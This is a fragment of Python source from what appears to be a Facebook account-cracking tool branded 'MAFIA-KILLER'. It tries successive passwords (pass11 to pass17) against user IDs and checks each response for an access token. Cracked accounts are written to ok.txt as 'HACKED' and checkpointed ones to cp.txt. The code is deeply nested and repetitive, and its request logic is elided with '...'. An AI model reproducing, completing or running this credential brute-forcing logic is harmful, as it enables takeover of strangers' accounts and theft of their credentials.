                                                                                        ...
                                                                                        if 'access_token' in d:
                                                                                            ...
                                                                                            if 'www.facebook.com' in d['error_msg']:
                                                                                                ...
                                                                                                if 'access_token' in d:
                                                                                                    ...
                                                                                                    d=json.loads(q)
                                                                                                    if 'www.facebook.com' in d['error_msg']:
                                                                                                        print("[CP-MAFIA-KILLER] "+uid+" | "+pass11)
                                                                                                        cp=open("cp.txt","a")
                                                                                                        cp.write(uid+" | "+pass11+"\n")
                                                                                                        cp.close()
                                                                                                        cps.append(uid)
                                                                                                        ...
                                                                                                        if 'access_token' in d:
                                                                                                            print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass11+"\x1b[1;0m")
                                                                                                            ok=open("ok.txt","a")
                                                                                                            ok.write(uid+" | "+pass11+"\n")
                                                                                                            ok.close()
                                                                                                            oks.append(uid)
                                                                                                            ...
                                                                                                            d=json.loads(q)
                                                                                                            if 'www.facebook.com' in d['error_msg']:
                                                                                                                print("[CP-MAFIA-KILLER] "+uid+" | "+pass12)
                                                                                                                cp=open("cp.txt","a")
                                                                                                                cp.write(uid+" | "+pass12+"\n")
                                                                                                                cp.close()
                                                                                                                cps.append(uid)
                                                                                                                ...
                                                                                                                if 'access_token' in d:
                                                                                                                    print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass12+"\x1b[1;0m")
                                                                                                                    ok=open("ok.txt","a")
                                                                                                                    ok.write(uid+" | "+pass12+"\n")
                                                                                                                    ok.close()
                                                                                                                    oks.append(uid)
                                                                                                                    ...
                                                                                                                    d=json.loads(q)
                                                                                                                    if 'www.facebook.com' in d['error_msg']:
                                                                                                                        print("[CP-MAFIA-KILLER] "+uid+" | "+pass13)
                                                                                                                        cp=open("cp.txt","a")
                                                                                                                        cp.write(uid+" | "+pass13+"\n")
                                                                                                                        cp.close()
                                                                                                                        cps.append(uid)
                                                                                                                        ...
                                                                                                                        if 'access_token' in d:
                                                                                                                            print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass13+"\x1b[1;0m")
                                                                                                                            ok=open("ok.txt","a")
                                                                                                                            ok.write(uid+" | "+pass13+"\n")
                                                                                                                            ok.close()
                                                                                                                            oks.append(uid)
                                                                                                                            ...
                                                                                                                            d=json.loads(q)
                                                                                                                            if 'www.facebook.com' in d['error_msg']:
                                                                                                                                print("[CP-MAFIA-KILLER] "+uid+" | "+pass14)
                                                                                                                                cp=open("cp.txt","a")
                                                                                                                                cp.write(uid+" | "+pass14+"\n")
                                                                                                                                cp.close()
                                                                                                                                cps.append(uid)
                                                                                                                                ...
                                                                                                                                if 'access_token' in d:
                                                                                                                                    print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass14+"\x1b[1;0m")
                                                                                                                                    ok=open("ok.txt","a")
                                                                                                                                    ok.write(uid+" | "+pass14+"\n")
                                                                                                                                    ok.close()
                                                                                                                                    oks.append(uid)
                                                                                                                                    ...
                                                                                                                                    d=json.loads(q)
                                                                                                                                    if 'www.facebook.com' in d['error_msg']:
                                                                                                                                        print("[CP-MAFIA-KILLER] "+uid+" | "+pass15)
                                                                                                                                        cp=open("cp.txt","a")
                                                                                                                                        cp.write(uid+" | "+pass15+"\n")
                                                                                                                                        cp.close()
                                                                                                                                        cps.append(uid)
                                                                                                                                        ...
                                                                                                                                        if 'access_token' in d:
                                                                                                                                            print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass15+"\x1b[1;0m")
                                                                                                                                            ok=open("ok.txt","a")
                                                                                                                                            ok.write(uid+" | "+pass15+"\n")
                                                                                                                                            ok.close()
                                                                                                                                            oks.append(uid)
                                                                                                                                            ...
                                                                                                                                            d=json.loads(q)
                                                                                                                                            if 'www.facebook.com' in d['error_msg']:
                                                                                                                                                print("[CP-MAFIA-KILLER] "+uid+" | "+pass16)
                                                                                                                                                cp=open("cp.txt","a")
                                                                                                                                                cp.write(uid+" | "+pass16+"\n")
                                                                                                                                                cp.close()
                                                                                                                                                cps.append(uid)
                                                                                                                                                ...
                                                                                                                                                if 'access_token' in d:
                                                                                                                                                    print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass16+"\x1b[1;0m")
                                                                                                                                                    ok=open("ok.txt","a")
                                                                                                                                                    ok.write(uid+" | "+pass16+"\n")
                                                                                                                                                    ok.close()
                                                                                                                                                    oks.append(uid)
                                                                                                                                                    ...
                                                                                                                                                    d=json.loads(q)
                                                                                                                                                    if 'www.facebook.com' in d['error_msg']:
                                                                                                                                                        print("[CP-MAFIA-KILLER] "+uid+" | "+pass17)
                                                                                                                                                        cp=open("cp.txt","a")
                                                                                                                                                        cp.write(uid+" | "+pass17+"\n")
                                                                                                                                                        cp.close()
                                                                                                                                                        cps.append(uid)
                                                                                                                                                        ...
                                                                                                                                                        if 'access_token' in d:
                                                                                                                                                            print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass17+"\x1b[1;0m")
                                                                                                                                                            ok=open("ok.txt","a")
                                                                                                                                                            ok.write(uid+" | "+pass17+"\n")
                                                                                                                                                            ok.close()
                                                                                                                                                            oks.append(uid)
